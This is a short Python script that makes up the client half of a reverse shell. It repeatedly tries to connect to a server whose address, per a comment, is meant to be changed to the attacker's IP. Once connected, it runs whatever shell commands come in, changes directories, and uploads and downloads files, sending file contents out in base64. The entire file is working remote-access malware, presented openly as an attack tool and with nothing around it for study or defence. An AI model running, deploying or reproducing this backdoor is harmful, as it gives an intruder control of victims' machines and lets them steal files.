import socket
import json
import subprocess
import os
import base64
import time

SERVER_IP = "127.0.0.1"  # Change this to attacker's IP if on different machine
SERVER_PORT = 9999

def reliable_send(data):
    json_data = json.dumps(data)
    client.send(json_data.encode())

def reliable_recv():
    data = b""
    while True:
        try:
            data += client.recv(1024)
            return json.loads(data.decode())
        except ValueError:
            continue

def connect():
    while True:
        try:
            client.connect((SERVER_IP, SERVER_PORT))
            break
        except:
            time.sleep(5)  # Retry after delay

def execute_command(command):
    return subprocess.getoutput(command)

def change_directory(path):
    try:
        os.chdir(path)
        return f"[+] Changed directory to {path}"
    except FileNotFoundError:
        return "[-] Directory not found."

def read_file(path):
    try:
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()
    except:
        return "[-] Failed to read file."

def write_file(path, content):
    try:
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "[+] Upload successful."
    except:
        return "[-] Upload failed."

def run():
    while True:
        command = reliable_recv()

        if command == "exit":
            break
        elif command.startswith("cd "):
            result = change_directory(command[3:])
        elif command.startswith("download "):
            result = read_file(command[9:])
        elif command.startswith("upload "):
            path = command[7:]
            file_data = reliable_recv()
            result = write_file(path, file_data)
        else:
            result = execute_command(command)

        reliable_send(result)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect()
run()
client.close()
